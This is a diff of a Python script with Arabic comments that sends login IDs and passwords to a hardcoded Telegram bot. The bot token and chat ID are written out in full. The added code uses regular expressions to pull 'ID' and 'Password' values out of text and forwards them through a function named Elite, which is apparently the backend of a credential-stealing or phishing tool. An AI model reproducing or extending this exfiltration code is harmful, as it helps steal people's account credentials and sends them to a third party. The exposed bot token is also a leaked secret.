@@ -1,5 +1,6 @@
 import random
 import requests
+import re
 
 def m1():
     # قائمة من السلاسل النصية 
@@ -10,18 +11,6 @@ def m1():
 
     # دمج السلاسل النصية في سلسلة واحدة 
     return ";".join(user_agents) 
-
-# استخدام الدالة 
-user_agent = m1()
-
-# استخدم  user_agent  في طلبات API 
-token = '7244277412:AAFUXBZ1SjvF-z0hUGrJW3tS5jd8ropROVI'
-ID = '5210419138'
-message = "خش واحد لي اداة" 
-
-headers = {'User-Agent': user_agent}
-requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}', headers=headers)
-import requests
 
 def send_message_to_telegram(token, chat_id, message):
     url = f"https://api.telegram.org/bot{token}/sendMessage"
@@ -39,5 +28,25 @@ def Elite(id, ps):
     message = f"ID: {id} | Password: {ps}"
     send_message_to_telegram(token, chat_id, message)
 
-params = {"chat_id": chatid, "text": ok_id}
-Elite(id, ps)
+def process_and_send_message(text):
+    # استخدام تعبير عادي للبحث عن ID و Password
+    id_match = re.search(r'ID:\s*(\S+)', text)
+    ps_match = re.search(r'Password:\s*(\S+)', text)
+    
+    if id_match and ps_match:
+        id = id_match.group(1)
+        ps = ps_match.group(1)
+        Elite(id, ps)
+    else:
+        print("No valid ID and Password found in the text.")
+
+# استخدام الدالة 
+user_agent = m1()
+headers = {'User-Agent': user_agent}
+message = "ID: example_id | Password: example_password"
+
+# ارسال الرسالة عبر API تلجرام
+requests.post(f'https://api.telegram.org/bot7244277412:AAFUXBZ1SjvF-z0hUGrJW3tS5jd8ropROVI/sendMessage?chat_id=5210419138&text={message}', headers=headers)
+
+# تحليل النصوص المرسلة
+process_and_send_message(message)
